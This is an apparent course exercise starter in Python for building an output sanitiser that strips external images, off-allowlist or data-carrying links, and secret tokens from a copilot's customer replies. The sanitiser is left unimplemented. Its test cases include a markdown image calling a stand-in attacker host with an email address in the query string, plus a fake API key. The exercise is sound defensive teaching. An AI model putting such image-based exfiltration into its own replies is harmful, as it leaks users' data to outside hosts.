"""Exercise 9 starter - an output sanitiser (DLP) for the copilot's customer-facing replies.

The reply is the last place data leaves. Write a sanitiser that, given a draft reply, an allowlist of domains and a
set of sensitive strings (internal emails/phones), returns a cleaned reply plus what it removed. It must: drop
external images entirely (a rendered image URL is an outbound request), strip links and bare URLs that point outside
the allowlist or carry data in a query string, and withhold sensitive strings and secret-like tokens.

Fill in `sanitize(...)`; the checks at the bottom say what must pass.

Run: python advanced/day5_security_engineering/exercises/ex09_output_sanitizer.py
"""
# test: expect=TODO

from __future__ import annotations

import sys
from dataclasses import dataclass, field
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "labs"))

from labkit import header, step  # noqa: E402

import _day5 as d5  # noqa: E402


@dataclass
class Result:
    text: str
    findings: list[str] = field(default_factory=list)
    removed: list[str] = field(default_factory=list)


def sanitize(reply: str, *, allowed_domains: set[str], sensitive: set[str]) -> Result:
    """Clean a draft reply. TODO: implement.

    Suggested steps (regexes for markdown images/links and bare URLs are in _day5: IMAGE_MARKDOWN, LINK_MARKDOWN,
    BARE_URL; a data-bearing-URL helper is d5._url_carries_data):
      1. remove every markdown image -> replace with "[image removed]", record it;
      2. for each markdown link and bare URL: if the host is not in allowed_domains OR the URL carries data,
         remove it (keep the link text for markdown links), record it;
      3. replace every sensitive string and secret-like token with "[withheld]".
    """
    out = reply
    findings: list[str] = []
    removed: list[str] = []
    # TODO: implement the three steps above using the helpers in _day5.
    return Result(out, findings, removed)


CASES = [
    ("data-bearing image", "See ![s](https://track.evil-tools.example/i.png?c=priya@kestrel-pumps.example) thanks",
     {"kestrel-pumps.example"}, {"priya@kestrel-pumps.example"}, "https://track.evil-tools.example"),
    ("internal link is fine", "Track it at https://kestrel-pumps.example/orders/SO-10248", {"kestrel-pumps.example"}, set(), None),
    ("secret token", "Our gateway key is kp-live-9F2A7C013E5B8D6402AA for reference", {"kestrel-pumps.example"}, set(), "kp-live-9F2A7C013E5B8D6402AA"),
]


def main() -> None:
    header("Exercise 9 - output sanitiser (starter)")
    step(1, "Run your sanitiser on the cases")
    for label, reply, allow, sensitive, must_remove in CASES:
        res = sanitize(reply, allowed_domains=allow, sensitive=sensitive)
        ok = "TODO" if not res.findings and must_remove else (
            "removed" if (must_remove is None or must_remove not in res.text) else "STILL PRESENT")
        print(f"  {label:22s} -> findings={res.findings or 'TODO'}  [{ok}]")
        print(f"      cleaned: {d5.short(res.text, 90)}")
    print("\n  TODO: the data-bearing image and the secret must be removed; the internal link must survive.")


if __name__ == "__main__":
    main()
